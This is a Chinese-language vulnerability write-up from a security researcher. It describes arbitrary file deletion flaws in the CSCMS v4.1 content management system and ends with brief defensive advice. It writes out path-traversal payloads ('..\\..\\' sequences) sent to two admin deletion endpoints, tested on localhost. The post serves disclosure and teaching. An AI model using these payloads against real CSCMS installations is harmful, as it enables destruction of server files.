###
[福建省海峡信息技术有限公司白帽子id：Bypass](https://mp.weixin.qq.com/s?timestamp=1531896788&src=3&ver=1&signature=KnIjFvcHiqFuFOLKmcC3Yfw-quDZnN7Dog9fOYPEbPDjU31klV*bZ6*vfj-SsSogN9uClKhWGzYO7-RrwrW9JlctZRRPFxnQtiYvZVn4L0OvKbXREW4CHNidMrO6tsea-zM)[](https://mp.weixin.qq.com/s?timestamp=1531896788&src=3&ver=1&signature=KnIjFvcHiqFuFOLKmcC3Yfw-quDZnN7Dog9fOYPEbPDjU31klV*bZ6*vfj-SsSogN9uClKhWGzYO7-RrwrW9JlctZRRPFxnQtiYvZVn4L0OvKbXREW4CHNidMrO6tsea-zMOTn4qS0FQKjvIlde-8FXqAUGPhLxBsdAldDoJP3w=)

 **相关精彩文章：http://suo.im/4Z3RZ8**

### 0x00 前言  

在一个网站中，涉及文件删除操作的函数，如果文件名可控，将可能存在任意文件删除漏洞，该漏洞可让攻击者随意删除服务器上的任意文件。
**[]()**[海峡信息白帽子id:Bypass通过CSCMS分享几个漏洞实例，水一文。](https://mp.weixin.qq.com/s?timestamp=1531896788&src=3&ver=1&signature=KnIjFvcHiqFuFOLKmcC3Yfw-quDZnN7Dog9fOYPEbPDjU31klV*bZ6*vfj-SsSogN9uClKhWGzYO7-RrwrW9JlctZRRPFxnQtiYvZVn4L0OvKbXREW4CHNidMrO6tsea-zMOTn4qS0FQKjvIlde-8FXqAUGPhLxBsdAldDoJP3w=)

### 0x01 环境搭建

CSCMS ：http://www.chshcms.com  
网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05）  
程序源码下载：https://github.com/chshcms/cscms

### 0x02 漏洞实例一

漏洞文件位置：\cscms\plugins\sys\admin\Basedb.php 第160-177行：  

![1.png](https://image.3001.net/images/20180718/15318968432300.png!small)  

漏洞利用：  
1、根目录下新建test目录作为测试：

![2.png](https://image.3001.net/images/20180718/15318968873929.png!small)  

2、构造参数成功删除test目录  
http://127.0.0.1/admin.php/basedb/del  
POST:id=..\\..\test

![3.png](https://image.3001.net/images/20180718/15318969113019.png!small)  

### 0x02 漏洞实例二

漏洞文件位置：/plugins/sys/admin/Skin.php 第418--440行：  

![4.png](https://image.3001.net/images/20180718/15318969431652.png!small)  

漏洞利用：  
网站根目录下新建1.txt文件作为测试，构造URL成功删除文件  
Payload：http://127.0.0.1/admin.php/skin/del?ac=pc&op=skins&dirs=default&file=..\\..\\..\\..\1.txt

![5.png](https://image.3001.net/images/20180718/15318969777478.png!small)

### 0x03 漏洞实例三

漏洞文件位置：/plugins/sys/admin/Plugins.php 第285-299行：  

![6.png](https://image.3001.net/images/20180718/15318969958303.png!small)  

漏洞利用：

  
![7.png](https://image.3001.net/images/20180718/15318970075038.png!small)

### 0x04 安全防御

限制文件删除函数可删除的目录位置、文件类型

文件名非用户可控  
  

有问题大家可以留言哦~也欢迎大家到海峡信息微信公众号中来玩耍呢！
[>>>点击跳转](https://mp.weixin.qq.com/s?timestamp=1531897242&src=3&ver=1&signature=KnIjFvcHiqFuFOLKmcC3YX0HFhNslqhPoz0NEiSxH2H3gHO96B-RoklaucnOjaEZ1fdsROeZbQGpifjzywh5oc0*2QaQx-PTU9OfYDU2HQbdo68EXbTwJxEd*2lIEYtAOlG4r1frr9T*eJRHXbs*e37DE4fByvo8V29pm1-Ej74=)  

  

  

#  

  

